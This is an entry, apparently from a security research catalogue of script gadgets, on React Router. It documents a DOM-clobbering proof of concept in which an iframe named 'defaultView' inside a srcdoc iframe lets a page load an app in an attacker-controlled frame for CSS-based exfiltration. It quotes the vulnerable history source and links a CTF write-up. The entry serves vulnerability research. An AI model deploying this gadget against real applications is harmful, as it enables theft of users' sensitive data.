---
description: React Router is a multi-strategy router for React bridging the gap from React 18 to React 19. You can use it maximally as a React framework or minimally as a library with your own architecture.
github: remix-run/react-router
gadgets:
  Latest:
    authors:
      - twitter:Strellic_
    tags:
      - chrome-browser
      - safari-browser
      - iframe-tag
      - srcdoc-attr
      - wh-host-csp
      - any-timing
    pocs:
      - description: Based on how [React Router](https://github.com/remix-run/react-router) handles routes with [createBrowserRouter](https://reactrouter.com/6.30.0/routers/create-browser-router), it is possible to clobber the `document.defaultView` value with an iframe and reload the application. This allows a page to be loaded within a user-controlled `<iframe srcdoc>`. As a result, it may be possible to exfiltrate sensitive information using CSS.
        code: |
          <iframe srcdoc="
          <!DOCTYPE html>
          <html>
            <head>
              <style>
                /* CSS Injection HERE */
              </style>
              <script type='module' crossorigin src='/assets/index.7352e15a.js'></script>
            </head>
            <body>
              <iframe name='defaultView' src='/home'></iframe>
              <div id='root'></div>
            </body>
          </html>
          " style='width:50vw; height: 50vh'></iframe>
        preview: false
    more-info: |
      **More Info**

      Source: <a target="_blank" href="https://github.com/remix-run/history/blob/3e9dab413f4eda8d6bce565388c5ddb7aeff9f7e/packages/history/index.ts#L367">https://github.com/remix-run/history/blob/3e9dab413f4eda8d6bce565388c5ddb7aeff9f7e/packages/history/index.ts#L367</a>

      ```javascript
      export function createBrowserHistory(
        options: BrowserHistoryOptions = {}
      ): BrowserHistory {
        let { window = document.defaultView! } = options;
        let globalHistory = window.history;

        function getIndexAndLocation(): [number, Location] {
          let { pathname, search, hash } = window.location;
          let state = globalHistory.state || {};
          return [
            state.idx,
            readOnly<Location>({
              pathname,
              search,
              hash,
              state: state.usr || null,
              key: state.key || "default",
            }),
          ];
        }
      ```
    links:
      - https://brycec.me/posts/corctf_2022_challenges#modernblog
---
